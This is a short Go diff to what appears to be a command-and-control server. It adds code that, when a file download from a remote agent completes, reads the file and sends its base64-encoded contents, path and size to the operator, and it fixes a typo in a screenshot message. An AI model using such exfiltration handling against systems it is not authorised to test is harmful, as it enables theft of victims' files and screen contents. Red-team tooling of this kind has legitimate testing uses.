@@ -3058,6 +3058,19 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 									Output["Type"] = "Good"
 									Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)
 
+									var err error
+									var n int
+									var FileData = make([]byte, download.TotalSize)
+									n, err = download.File.ReadAt(FileData,0)
+									logger.Debug(fmt.Sprintf("downloadComplete, %v, %v", n, err))
+									if err == nil {
+										Output["MiscType"] = "downloadComplete"
+										Output["MiscData"] = base64.StdEncoding.EncodeToString([]byte(FileData))
+										Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(download.FilePath)) + ";" + strconv.Itoa(int(download.TotalSize))
+									} else {
+										logger.Error(fmt.Sprintf("Could not read file %v after download", download.FilePath))
+									}
+
 									a.DownloadClose(FileID)
 								} else if Reason == 0x1 {
 									Output["Type"] = "Info"
@@ -4858,7 +4871,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						}
 
 						Message["Type"] = "Good"
-						Message["Message"] = "Successful took screenshot"
+						Message["Message"] = "Successfully took screenshot"
 
 						Message["MiscType"] = "screenshot"
 						Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
